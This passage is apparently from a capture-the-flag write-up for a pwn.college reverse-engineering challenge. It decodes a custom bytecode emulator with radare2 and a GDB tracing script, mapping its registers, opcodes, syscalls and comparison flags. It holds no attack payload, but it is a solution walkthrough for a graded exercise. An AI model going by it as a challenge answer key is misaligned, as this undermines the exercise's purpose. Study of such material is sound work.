+<li>View <code>sym.interpret_cmp</code> to understand what values will be set in the emulated flag register (focus on the branching, i.e. what <code>test</code>/<code>cmp</code> conditions are required to either jump or not jump?), and based on the condition we can assign some identifiable characters ('L', 'G', 'E', 'N', 'Z') for reference:</li>
+</ul>
+<blockquote>
+<p>[0x00001180]&gt; <code>VV @ sym.interpret_cmp</code></p>
+</blockquote>
+<ul>
+<li>If cmp_x &lt; cmp_y (i.e. 'L'), then flag_value = flag_value | 0x10:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/51-interpret_cmp.png" alt="interpret_cmp L" /></li>
+<li>If cmp_x &gt; cmp_y (i.e. 'G'), then flag_value = flag_value | 0x01:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/52-interpret_cmp.png" alt="interpret_cmp G" /></li>
+<li>If cmp_x == cmp_y (i.e. 'E'), then flag_value = flag_value | 0x02:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/53-interpret_cmp.png" alt="interpret_cmp E" /></li>
+<li>If cmp_x != cmp_y (i.e. 'N'), then flag_value = flag_value | 0x04:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/54-interpret_cmp.png" alt="interpret_cmp N" /></li>
+<li>If cmp_x == cmp_y == 0 (i.e. 'Z'), then flag_value = flag_value | 0x08:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/55-interpret_cmp.png" alt="interpret_cmp Z" /></li>
+</ul>
+<h3 id="summary-of-part-1"><a class="header" href="#summary-of-part-1">Summary of Part 1</a></h3>
+<ul>
+<li>Each instruction is <strong>size 3 bytes</strong> (Note: the instruction order can change for different versions of the ELF binary)</li>
+<li>Register, opcode, syscall, compare lookup values are known (Note: the register, opcode, syscall and cmp mappings can change for different versions of the ELF binary):</li>
+</ul>
+<pre><code># Pseudo Python code for notes purposes only
+registers = {
+    reg_0x3fc: 0x20, # (case 32)
+    reg_0x3fd: 0x08, # (case 08)
+    reg_0x3fe: 0x10, # (case 16)
+    reg_0x3ff: 0x01, # (case 01)
+    reg_0x400: 0x02, # (case 02)
+    reg_0x401: 0x04, # (case 04)
+    reg_0x402: 0x40, # (case 40)
+}
+opcodes = {
+    'imm': 0x01,
+    'add': 0x02,
+    'stk': 0x04,
+    'stm': 0x40,
+    'ldm': 0x80,
+    'cmp': 0x20,
+    'jmp': 0x10,
+    'sys': 0x08,
+}
+syscalls = {
+    'open'          : 0x20,
+    'read_code'     : 0x01,
+    'read_memory'   : 0x08,
+    'write'         : 0x04,
+    'sleep'         : 0x10,
+    'exit'          : 0x02,
+}
+# CMP and JMP are closely linked, so assume that they interpreted in the same way
+jump_description = ''
+if flag_value &amp; 0x10: jump_description += 'L'
+if flag_value &amp; 0x01: jump_description += 'G'
+if flag_value &amp; 0x02: jump_description += 'E'
+if flag_value &amp; 0x04: jump_description += 'N'
+if flag_value &amp; 0x08: jump_description += 'Z'
+</code></pre>
+<h2 id="part-2-dynamic-analysis-using-gdb"><a class="header" href="#part-2-dynamic-analysis-using-gdb">[Part 2] Dynamic Analysis Using GDB</a></h2>
+<blockquote>
+<p>$ <code>gdb -q /level14_testing1</code><br />
+(gdb) <code>disass interpret_instruction</code></p>
+</blockquote>
+<pre><code>Dump of assembler code for function interpret_instruction:
+   [...]
+   0x0000000000001aa8 &lt;+45&gt;:	call   0x1491 &lt;interpret_imm&gt;
+   [...]
+   0x0000000000001ac6 &lt;+75&gt;:	call   0x14c4 &lt;interpret_add&gt;
+   [...]
+   0x0000000000001ae4 &lt;+105&gt;:	call   0x1527 &lt;interpret_stk&gt;
+   [...]
+   0x0000000000001b02 &lt;+135&gt;:	call   0x15e6 &lt;interpret_stm&gt;
+   [...]
+   0x0000000000001b1a &lt;+159&gt;:	call   0x1643 &lt;interpret_ldm&gt;
+   [...]
+   0x0000000000001b38 &lt;+189&gt;:	call   0x1698 &lt;interpret_cmp&gt;
+   [...]
+   0x0000000000001b56 &lt;+219&gt;:	call   0x179c &lt;interpret_jmp&gt;
+   [...]
+   0x0000000000001b74 &lt;+249&gt;:	call   0x17f5 &lt;interpret_sys&gt;
+   [...]
+</code></pre>
+<ul>
+<li>Print some helpful output at every breakpoint (<code>i r</code>==<code>info registers</code>, <code>x/8i $rip</code> displays the next 8 instructions):</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>define hook-stop</code></p>
+</blockquote>
+<pre><code>Type commands for definition of &quot;hook-stop&quot;.
+End with a line saying just &quot;end&quot;.
+&gt;i r
+&gt;x/8i $rip
+&gt;end
+</code></pre>
+<ul>
+<li>Set breakpoint at all <code>interpret_*</code> functions:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>b interpret_imm</code><br />
+(gdb) <code>b interpret_add</code><br />
+(gdb) <code>b interpret_stk</code><br />
+(gdb) <code>b interpret_stm</code><br />
+(gdb) <code>b interpret_ldm</code><br />
+(gdb) <code>b interpret_cmp</code><br />
+(gdb) <code>b interpret_jmp</code><br />
+(gdb) <code>b interpret_sys</code></p>
+</blockquote>
+<ul>
+<li>Run program:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>r</code></p>
+</blockquote>
+<ul>
+<li>1st cycle, interrupted at <code>interpret_imm</code>, <code>info registers</code> shows:</li>
+</ul>
+<blockquote>
+<p>rsi    0x470101    (which is 0x010147 when accounting for endianness)</p>
+</blockquote>
+<ul>
+<li>Continue:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>c</code></p>
+</blockquote>
+<ul>
+<li>2nd cycle, interrupted at <code>interpret_imm</code>, <code>info registers</code> shows:</li>
+</ul>
+<blockquote>
+<p>rsi   0x891001    (which is 0x011089 when accounting for endianness)</p>
+</blockquote>
+<ul>
+<li>These are the first 6 bytes of the <code>obj.vm_code</code> (emulator's bytecode) looked at in radare2 earlier, recall the following in radare2:</li>
+</ul>
+<blockquote>
+<p><code>V @ obj.vm_code</code></p>
+</blockquote>
+<pre><code>[0x00004020 [Xadvc]0 62% 896 /level14_testing1]&gt; xc @ obj.vm_code    
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF  comment
+0x00004020  0101 4701 1089 4010 0101 012e 0110 8f40  ..G...@........@  ; obj.vm_code
+0x00004030  1001 0101 4c01 1082 4010 0101 01ab 0110  ....L...@.......
+[...]
+</code></pre>
+<ul>
+<li>Split instructions into groups of 3 bytes, then order appears to be [op, arg1, arg2]:</li>
+</ul>
+<pre><code>[0x01, 0x01, 0x47] -&gt; imm reg_0x3ff, 0x47
+[0x01, 0x10, 0x89] -&gt; imm reg_0x3fe, 0x89
+[0x40, 0x10, 0x01] -&gt; guess... stm reg_0x3fe, reg_0x3ff maybe?
+</code></pre>
+<ul>
+<li>Test <code>interpret_stm</code> assumption by continuing and looking at which interpret_??? function we end up breaking at:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>c</code></p>
+</blockquote>
+<ul>
+<li>3rd cycle, interrupted at <code>interpret_stm</code>, <code>info registers</code> appears to corroborate above assumption:</li>
+</ul>
+<blockquote>
+<p>rsi    0x11040    (which is 0x401001 when accounting for endianness)</p>
+</blockquote>
+<ul>
+<li>Keep going through the vm_code to guess the next three instructions:</li>
+</ul>
+<pre><code>[0x01, 0x01, 0x2e] -&gt; imm reg_0x3ff, 0x2e
+[0x01, 0x10, 0x8f] -&gt; imm reg_0x3fe, 0x8f
+[0x40, 0x10, 0x01] -&gt; guess... stm reg_0x3fe, reg_0x3ff again maybe?
+</code></pre>
+<ul>
+<li>Continue again to test assumption:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>c</code></p>
+</blockquote>
+<ul>
+<li>4th cycle, interrupted at <code>interpret_imm</code>, <code>info registers</code> shows:</li>
+</ul>
+<blockquote>
+<p>rsi    0x2e0101    (which is 0x01012e when accounting for endianness)</p>
+</blockquote>
+<ul>
+<li>Continue:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>c</code></p>
+</blockquote>
+<ul>
+<li>5th cycle, interrupted at <code>interpret_imm</code>, <code>info registers</code> shows:</li>
+</ul>
+<blockquote>
+<p>rsi    0x8f1001    (which is 0x01108f when accounting for endianness)</p>
+</blockquote>
+<ul>
+<li>6th cycle, interrupted at <code>interpret_stm</code>, <code>info registers</code> shows:</li>
+</ul>
+<blockquote>
+<p>rsi    0x11040    (which is 0x401001 when accounting for endianness)</p>
+</blockquote>
+<ul>
+<li>Therefore, instruction order when viewing <code>obj.vm_code</code> is [op, arg1, arg2] (Note: the instruction order can change for different versions of the ELF binary)</li>
+<li>At this point (at beginning of 6th cycle, i.e. not yet executed current [0x40, 0x10, 0x01] instruction), based on the instructions executed thus far, the state of the emulator's registers is expected to be:</li>
+</ul>
+<pre><code>reg_0x3fc = 0x00
+reg_0x3fd = 0x00
+reg_0x3fe = 0x8f
+reg_0x3ff = 0x2e
+reg_0x400 = 0x00
+reg_0x401 = 0x00
+reg_0x402 = 0x00
+</code></pre>
+<ul>
+<li>Assuming there is a register for the instruction pointer, one of the above register values is likely <strong>incorrect</strong></li>
+<li>If instruction pointer register holds the value of the <strong>next</strong> instruction, then the value maybe could be 0x06?</li>
+<li>If instruction pointer register holds the value of the <strong>previous</strong> instruction, then the value maybe could be 0x05?</li>
+<li>Examine the stack to have a look for the emulator's stored state on the stack (Note: examine much more than the current function's stack frame, because we need to look for the state of the emulator's registers, which will be stored much earlier in the program's stack):</li>
+</ul>
+<blockquote>
+<p>(gdb) x/150gx $rsp</p>
+</blockquote>
+<pre><code>[...]
+0x7ffe124a57f8:	0x0000000000000000	0x0000000000000000
+0x7ffe124a5808:	0x2e8f000000000000	0x00007ffe12000600 &lt;-- These values look familiar
+0x7ffe124a5818:	0xa957b0f74c9c8000	0x0000000000000000
+0x7ffe124a5828:	0x00007fc32cc8e0b3	0x0000000000000031
+0x7ffe124a5838:	0x00007ffe124a5918	0x000000012ce4f618
+0x7ffe124a5848:	0x000056465be1dbff	0x000056465be1dd20
+</code></pre>
+<ul>
+<li>Note that the memory addresses are likely to be different each time the program is run, so the relative addresses are the important parts to focus on</li>
+<li>Examine 7 bytes where it looks like the state of the registers is stored:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>x/7bx 0x7ffe124a5808 + 0x04</code></p>
+</blockquote>
+<pre><code>0x7ffe124a580c:	0x00	0x00	0x8f	0x2e	0x00	0x06	0x00
+??registers???: 0x3fc   0x3fd   0x3fe   0x3ff   0x400   0x401   0x402
+</code></pre>
+<ul>
+<li>Revise assumption on state of the emulator's registers based on dumped stack values:</li>
+</ul>
+<pre><code>reg_0x3fc = 0x00
+reg_0x3fd = 0x00
+reg_0x3fe = 0x8f
+reg_0x3ff = 0x2e
+reg_0x400 = 0x00
+reg_0x401 = 0x06 &lt;-- Updated value (likely to be value of instruction pointer)
+reg_0x402 = 0x00
+</code></pre>
+<ul>
+<li>Calculate distance emulator's register state is stored on stack <strong>relative</strong> to stack pointer at current breakpoint:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>p $rsp</code><br />
+$1 = (void *) 0x7ffe124a53a8<br />
+(gdb) <code>p 0x7ffe124a580c - 0x7ffe124a53a8</code><br />
+$2 = 1124</p>
+</blockquote>
+<ul>
+<li>Check calculation is correct:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>p/x $rsp + 1124</code>
+$3 = 0x7ffe124a580c</p>
+</blockquote>
+<ul>
+<li>The 1124 (decimal) relative offset from stack pointer should be the same for each of the interpret_* breakpoints, if assumption is wrong it will become apparent in the next section when a GDB script is used to run program in batch mode and print useful info</li>
+</ul>
+<h3 id="dynamic-analysis-using-gdb-scripting"><a class="header" href="#dynamic-analysis-using-gdb-scripting">Dynamic Analysis Using GDB Scripting</a></h3>
+<ul>
+<li>Write a GDB script using the known mappings derived thus far, snippets of the GDB script will be described below:</li>
+</ul>
+<blockquote>
+<p>$ <code>vim /tmp/rev_level14_testing1.gdb</code></p>
+</blockquote>
+<ul>
+<li>Begin script with <code>start</code> so that breakpoint is set at main and process is run:</li>
+</ul>
+<pre><code>start
+</code></pre>
+<ul>
+<li>Set some variables that will used repeatedly</li>
+<li><code>reg_offs</code> is the offset from rsp that was determined in the previous section that locates the emulator's register state</li>
+<li>In the previous section, the instructions were found to be in rsi at the relevant breakpoints, so <code>shift_op</code>, <code>shift_a1</code>, <code>shift_a2</code> are the amounts to shift rsi by to isolate each byte of the instruction</li>
+</ul>
+<pre><code>set $reg_offs = 1124
+set $shift_op = 0x00
+set $shift_a1 = 0x08
+set $shift_a2 = 0x10
+</code></pre>
+<ul>
+<li>Register mappings were determined in the radare2 static analysis performed previously:</li>
+</ul>
+<pre><code>define describe_reg
+    if $arg0 == 0x20
+        printf &quot;reg_0x3fc&quot;
+    end
+    if $arg0 == 0x08
+        printf &quot;reg_0x3fd&quot;
+    end
+    if $arg0 == 0x10
+        printf &quot;reg_0x3fe&quot;
+    end
+    if $arg0 == 0x01
+        printf &quot;reg_0x3ff&quot;
+    end
+    if $arg0 == 0x02
+        printf &quot;reg_0x400&quot;
+    end
+    if $arg0 == 0x04
+        printf &quot;reg_0x401&quot;
+    end
+    if $arg0 == 0x40
+        printf &quot;reg_0x402&quot;
+    end
+    if $arg0 == 0x00
+        printf &quot;NONE&quot;
+    end
+end
+</code></pre>
+<ul>
+<li>Syscall mappings were determined in the radare2 static analysis performed previously:</li>
+</ul>
+<pre><code>define describe_sys
+    if $arg0 == 0x20
+        printf &quot;open&quot;
+    end
+    if $arg0 == 0x01
+        printf &quot;read_code&quot;
+    end
+    if $arg0 == 0x08
+        printf &quot;read_memory&quot;
+    end
+    if $arg0 == 0x04
+        printf &quot;write&quot;
+    end
+    if $arg0 == 0x10
+        printf &quot;sleep&quot;
+    end
+    if $arg0 == 0x02
+        printf &quot;exit&quot;
+    end
+end
+</code></pre>
+<ul>
+<li>Jump mappings were determined in the radare2 static analysis performed previously:</li>
+</ul>
+<pre><code>define describe_jmp
+    if $arg0 &amp; 0x10
+        printf &quot;L&quot;
+    end
+    if $arg0 &amp; 0x01
+        printf &quot;G&quot;
+    end
+    if $arg0 &amp; 0x04
+        printf &quot;N&quot;
+    end
+    if $arg0 &amp; 0x08
+        printf &quot;Z&quot;
+    end
+    if $arg0 &amp; 0x02
+        printf &quot;E&quot;
+    end
+end
+</code></pre>
+<ul>
+<li>Define a function that prints the emulator's register state that can be called at each breakpoint:</li>
+</ul>
+<pre><code>define vm_state
+    set $reg_state = (long long) *(void**) ($rsp + $reg_offs)
+    printf &quot;[V] reg_0x3fc:%#x reg_0x3fd:%#x reg_0x3fe:%#x reg_0x3ff:%#x reg_0x400:%#x reg_0x401:%#x reg_0x402:%#x\n&quot;, $reg_state &gt;&gt; 0x00 &amp; 0xff, $reg_state &gt;&gt; 0x08 &amp; 0xff, $reg_state &gt;&gt; 0x10 &amp; 0xff, $reg_state &gt;&gt; 0x18 &amp; 0xff, $reg_state &gt;&gt; 0x20 &amp; 0xff, $reg_state &gt;&gt; 0x28 &amp; 0xff, $reg_state &gt;&gt; 0x30 &amp; 0xff
+end
+</code></pre>
+<ul>
+<li>Define a function that describes each instruction that can be called at each breakpoint:</li>
+</ul>
+<pre><code>define vm_instruction
+    printf &quot;[I] op:%#x arg1:%#x arg2:%#x\n&quot;, $rsi&gt;&gt;$shift_op&amp;0xff, $rsi&gt;&gt;$shift_a1&amp;0xff, $rsi&gt;&gt;$shift_a2&amp;0xff
+end
+</code></pre>
+<ul>
+<li>Break at all the <code>interpret_*</code> function calls and print some useful info using a combo of previously defined helper functions and <code>printf</code> specific to each breakpoint:</li>
+</ul>
+<pre><code>break interpret_imm
+commands
+    vm_state
+    vm_instruction
+    printf &quot;[s] IMM &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a1&amp;0xff)
+    printf &quot; = %#x\n&quot;, $rsi&gt;&gt;$shift_a2&amp;0xff
+    continue
+end
+
+break interpret_add
+commands
+    vm_state
+    vm_instruction
+    printf &quot;[s] ADD &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a1&amp;0xff)
+    printf &quot; &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a2&amp;0xff)
+    printf &quot; \n&quot;
+    continue
+end
+
+break interpret_stk
+commands
+    vm_state
+    vm_instruction
+    printf &quot;[s] STK &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a1&amp;0xff)
+    printf &quot; &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a2&amp;0xff)
+    printf &quot; \n&quot;
+    printf &quot;[s] ... pushing &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a2&amp;0xff)
+    printf &quot;\n&quot;
+    printf &quot;[s] ... popping &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a1&amp;0xff)
+    printf &quot;\n&quot;
+    continue
+end
+
+break interpret_stm
+commands
+    vm_state
+    vm_instruction
+    printf &quot;[s] STM *&quot;
+    describe_reg ($rsi&gt;&gt;$shift_a1&amp;0xff)
+    printf &quot; = &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a2&amp;0xff)
+    printf &quot; \n&quot;
+    continue
+end
+
+break interpret_ldm
+commands
+    vm_state
+    vm_instruction
+    printf &quot;[s] LDM &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a1&amp;0xff)
+    printf &quot; = *&quot;
+    describe_reg ($rsi&gt;&gt;$shift_a2&amp;0xff)
+    printf &quot; \n&quot;
+    continue
+end
+
+break interpret_cmp
+commands
+    vm_state
+    vm_instruction
+    printf &quot;[s] CMP &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a1&amp;0xff)
+    printf &quot; &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a2&amp;0xff)
+    printf &quot; \n&quot;
+    continue
+end
+
+break interpret_jmp
+commands
+    vm_state
+    vm_instruction
+    printf &quot;[s] JMP &quot;
+    describe_jmp ($rsi&gt;&gt;$shift_a1&amp;0xff)
+    printf &quot; &quot;
+    describe_reg ($rsi&gt;&gt;$shift_a2&amp;0xff)
+    printf &quot; \n&quot;
+    continue
+end
+
+break interpret_sys
+commands
+    vm_state
+    vm_instruction
+    printf &quot;[s] SYS %#x &quot;, $rsi&gt;&gt;$shift_a1&amp;0xff
+    describe_reg ($rsi&gt;&gt;$shift_a2&amp;0xff)
+    printf &quot; \n&quot;
+    printf &quot;[s] ... &quot;
+    describe_sys ($rsi&gt;&gt;$shift_a1&amp;0xff)
+    printf &quot; \n&quot;
+    continue
+end
+
+break crash
+commands
+    vm_instruction
+    printf &quot;[s] CRASH\n&quot;
+    continue
+end
+
+</code></pre>
+<ul>
+<li>Finally, end with <code>continue</code> so that GDB will be able to continue execution of program:</li>
+</ul>
+<pre><code>continue
+</code></pre>
+<ul>
+<li>Run GDB in batch mode with the script just written:</li>
+</ul>
+<blockquote>
+<p>$ <code>gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb</code></p>
+</blockquote>
+<pre><code>Breakpoint 9, 0x000056246321f7f5 in interpret_sys ()
+[V] reg_0x3fc:0 reg_0x3fd:0x40 reg_0x3fe:0xe reg_0x3ff:0xb reg_0x400:0xe reg_0x401:0x46 reg_0x402:0
+[I] op:0x8 arg1:0x8 arg2:0x1
+[s] SYS 0x8 reg_0x3ff 
+[s] ... read_memory 
+</code></pre>
+<ul>
+<li>It stops and waits for input from STDIN, input <code>AAAAAAAA</code> to see what happens:</li>
+</ul>
+<pre><code>[...]
+Breakpoint 9, 0x000056246321f7f5 in interpret_sys ()
+[V] reg_0x3fc:0x1 reg_0x3fd:0xc reg_0x3fe:0xb reg_0x3ff:0xa reg_0x400:0x16 reg_0x401:0x87 reg_0x402:0x5
+[I] op:0x8 arg1:0x4 arg2:0x1
+[s] SYS 0x4 reg_0x3ff 
+[s] ... write 
+INCORRECT!
+
+Breakpoint 2, 0x000056246321f491 in interpret_imm ()
+[V] reg_0x3fc:0x1 reg_0x3fd:0xc reg_0x3fe:0xb reg_0x3ff:0xb reg_0x400:0x16 reg_0x401:0x88 reg_0x402:0x5
+[I] op:0x1 arg1:0x20 arg2:0x1
+[s] IMM reg_0x3fc = 0x1
+
+Breakpoint 9, 0x000056246321f7f5 in interpret_sys ()
+[V] reg_0x3fc:0x1 reg_0x3fd:0xc reg_0x3fe:0xb reg_0x3ff:0xb reg_0x400:0x16 reg_0x401:0x89 reg_0x402:0x5
+[I] op:0x8 arg1:0x2 arg2:0
+[s] SYS 0x2 NONE 
+[s] ... exit 
+</code></pre>
+<ul>
+<li><code>AAAAAAAA</code> was incorrect</li>
+<li>Different input can be altered and piped in using a simple inline Python command:</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'\x41'*20)&quot; | gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb</code></p>
+</blockquote>
+<pre><code>[...]
+Breakpoint 9, 0x000056246321f7f5 in interpret_sys ()
+[V] reg_0x3fc:0x1 reg_0x3fd:0xc reg_0x3fe:0xb reg_0x3ff:0xa reg_0x400:0x16 reg_0x401:0x87 reg_0x402:0x5
+[I] op:0x8 arg1:0x4 arg2:0x1
+[s] SYS 0x4 reg_0x3ff 
+[s] ... write 
+INCORRECT!
+
+Breakpoint 2, 0x000056246321f491 in interpret_imm ()
+[V] reg_0x3fc:0x1 reg_0x3fd:0xc reg_0x3fe:0xb reg_0x3ff:0xb reg_0x400:0x16 reg_0x401:0x88 reg_0x402:0x5
+[I] op:0x1 arg1:0x20 arg2:0x1
+[s] IMM reg_0x3fc = 0x1
+
+Breakpoint 9, 0x000056246321f7f5 in interpret_sys ()
+[V] reg_0x3fc:0x1 reg_0x3fd:0xc reg_0x3fe:0xb reg_0x3ff:0xb reg_0x400:0x16 reg_0x401:0x89 reg_0x402:0x5
+[I] op:0x8 arg1:0x2 arg2:0
+[s] SYS 0x2 NONE 
+[s] ... exit 
+</code></pre>
+<ul>
+<li>But the above input was still incorrect</li>
+</ul>
+<h4 id="identifying-the-instruction-pointer-register"><a class="header" href="#identifying-the-instruction-pointer-register">Identifying the Instruction Pointer Register</a></h4>
+<ul>
+<li>Analyse the output in more detail by <code>grep</code>ping for the somewhere near the start and selecting the 50 lines after it:</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'\x41'*20)&quot; | gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb | grep -A50 &quot;\[+\] Starting interpreter loop! Good luck!&quot;</code></p>
+</blockquote>
+<pre><code>[+] Starting interpreter loop! Good luck!
+
+Breakpoint 2, 0x000055f95929e491 in interpret_imm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0 reg_0x3ff:0 reg_0x400:0 reg_0x401:0x1 reg_0x402:0
+[I] op:0x1 arg1:0x1 arg2:0x47
+[s] IMM reg_0x3ff = 0x47
+
+Breakpoint 2, 0x000055f95929e491 in interpret_imm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0 reg_0x3ff:0x47 reg_0x400:0 reg_0x401:0x2 reg_0x402:0
+[I] op:0x1 arg1:0x10 arg2:0x89
+[s] IMM reg_0x3fe = 0x89
+
+Breakpoint 5, 0x000055f95929e5e6 in interpret_stm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x89 reg_0x3ff:0x47 reg_0x400:0 reg_0x401:0x3 reg_0x402:0
+[I] op:0x40 arg1:0x10 arg2:0x1
+[s] STM *reg_0x3fe = reg_0x3ff 
+
+Breakpoint 2, 0x000055f95929e491 in interpret_imm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x89 reg_0x3ff:0x47 reg_0x400:0 reg_0x401:0x4 reg_0x402:0
+[I] op:0x1 arg1:0x1 arg2:0x2e
+[s] IMM reg_0x3ff = 0x2e
+
+Breakpoint 2, 0x000055f95929e491 in interpret_imm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x89 reg_0x3ff:0x2e reg_0x400:0 reg_0x401:0x5 reg_0x402:0
+[I] op:0x1 arg1:0x10 arg2:0x8f
+[s] IMM reg_0x3fe = 0x8f
+
+Breakpoint 5, 0x000055f95929e5e6 in interpret_stm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x8f reg_0x3ff:0x2e reg_0x400:0 reg_0x401:0x6 reg_0x402:0
+[I] op:0x40 arg1:0x10 arg2:0x1
+[s] STM *reg_0x3fe = reg_0x3ff 
+
+Breakpoint 2, 0x000055f95929e491 in interpret_imm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x8f reg_0x3ff:0x2e reg_0x400:0 reg_0x401:0x7 reg_0x402:0
+[I] op:0x1 arg1:0x1 arg2:0x4c
+[s] IMM reg_0x3ff = 0x4c
+
+Breakpoint 2, 0x000055f95929e491 in interpret_imm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x8f reg_0x3ff:0x4c reg_0x400:0 reg_0x401:0x8 reg_0x402:0
+[I] op:0x1 arg1:0x10 arg2:0x82
+[s] IMM reg_0x3fe = 0x82
+
+Breakpoint 5, 0x000055f95929e5e6 in interpret_stm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x82 reg_0x3ff:0x4c reg_0x400:0 reg_0x401:0x9 reg_0x402:0
+[I] op:0x40 arg1:0x10 arg2:0x1
+[s] STM *reg_0x3fe = reg_0x3ff 
+
+Breakpoint 2, 0x000055f95929e491 in interpret_imm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x82 reg_0x3ff:0x4c reg_0x400:0 reg_0x401:0xa reg_0x402:0
+[I] op:0x1 arg1:0x1 arg2:0xab
+[s] IMM reg_0x3ff = 0xab
+</code></pre>
+<ul>
+<li><code>reg_0x401</code> is incrementing by 1 at each new instruction, so this again confirms the assumption that this register is keeping track of the instruction pointer</li>
+</ul>
+<h4 id="identifying-the-stack-pointer-register"><a class="header" href="#identifying-the-stack-pointer-register">Identifying the Stack Pointer Register</a></h4>
+<ul>
+<li>Now grep for some specific instructions (starting with <code>STK</code>) and print some lines above and below:</li>
+</ul>
+<blockquote>
+<p>$ <code>python -c &quot;import sys; sys.stdout.buffer.write(b'\x41'*20)&quot; | gdb /level14_testing1 -batch -x /tmp/rev_level14_testing1.gdb | grep -B3 -A5 &quot;STK&quot; | grep -v &quot;... popping NONE&quot; | grep -v &quot;... pushing NONE&quot;</code></p>
+</blockquote>
+<ul>
+<li>Using <code>-v</code> tag, exclude lines that print &quot;... popping NONE&quot; and &quot;... pushing NONE&quot;, as these are a result of the GDB script not being refined enough to work out when an in instruction is a push only or a pop only instruction</li>
+</ul>
+<pre><code>Breakpoint 4, 0x0000562462367527 in interpret_stk ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x8c reg_0x3ff:0xc2 reg_0x400:0 reg_0x401:0x1f reg_0x402:0
+[I] op:0x4 arg1:0 arg2:0x20
+[s] STK NONE reg_0x3fc 
+[s] ... pushing reg_0x3fc
+
+Breakpoint 4, 0x0000562462367527 in interpret_stk ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x8c reg_0x3ff:0xc2 reg_0x400:0x1 reg_0x401:0x20 reg_0x402:0
+[I] op:0x4 arg1:0 arg2:0x8
+[s] STK NONE reg_0x3fd 
+[s] ... pushing reg_0x3fd
+
+Breakpoint 4, 0x0000562462367527 in interpret_stk ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x8c reg_0x3ff:0xc2 reg_0x400:0x2 reg_0x401:0x21 reg_0x402:0
+[I] op:0x4 arg1:0 arg2:0x10
+[s] STK NONE reg_0x3fe 
+[s] ... pushing reg_0x3fe
+
+Breakpoint 2, 0x0000562462367491 in interpret_imm ()
+[V] reg_0x3fc:0 reg_0x3fd:0 reg_0x3fe:0x8c reg_0x3ff:0xc2 reg_0x400:0x3 reg_0x401:0x22 reg_0x402:0
+--
+Breakpoint 4, 0x0000562462367527 in interpret_stk ()
+[V] reg_0x3fc:0 reg_0x3fd:0x4 reg_0x3fe:0x8c reg_0x3ff:0x45 reg_0x400:0x3 reg_0x401:0x25 reg_0x402:0
+[I] op:0x4 arg1:0 arg2:0x1
+[s] STK NONE reg_0x3ff 
+[s] ... pushing reg_0x3ff
+
+Breakpoint 2, 0x0000562462367491 in interpret_imm ()
+[V] reg_0x3fc:0 reg_0x3fd:0x4 reg_0x3fe:0x8c reg_0x3ff:0x45 reg_0x400:0x4 reg_0x401:0x26 reg_0x402:0
+[...]
+</code></pre>
+<ul>
+<li>From the above output, it can be seen that the line showing the register state <strong>after</strong> each <strong>push</strong> instruction, the value of <code>reg_0x400</code> <strong>increases</strong></li>
+<li>If we keep looking through the output, there are some pop instructions:</li>
+</ul>
+<pre><code>[...]
+Breakpoint 4, 0x0000562462367527 in interpret_stk ()
+[V] reg_0x3fc:0 reg_0x3fd:0x40 reg_0x3fe:0xe reg_0x3ff:0xe reg_0x400:0xe reg_0x401:0x47 reg_0x402:0
+[I] op:0x4 arg1:0x10 arg2:0
+[s] STK reg_0x3fe NONE 
+[s] ... popping reg_0x3fe
+
+Breakpoint 4, 0x0000562462367527 in interpret_stk ()
+[V] reg_0x3fc:0 reg_0x3fd:0x40 reg_0x3fe:0x20 reg_0x3ff:0xe reg_0x400:0xd reg_0x401:0x48 reg_0x402:0
+[I] op:0x4 arg1:0x8 arg2:0
+[s] STK reg_0x3fd NONE 
+[s] ... popping reg_0x3fd
+
+Breakpoint 4, 0x0000562462367527 in interpret_stk ()
+[V] reg_0x3fc:0 reg_0x3fd:0x3a reg_0x3fe:0x20 reg_0x3ff:0xe reg_0x400:0xc reg_0x401:0x49 reg_0x402:0
+[I] op:0x4 arg1:0x20 arg2:0
+[s] STK reg_0x3fc NONE 
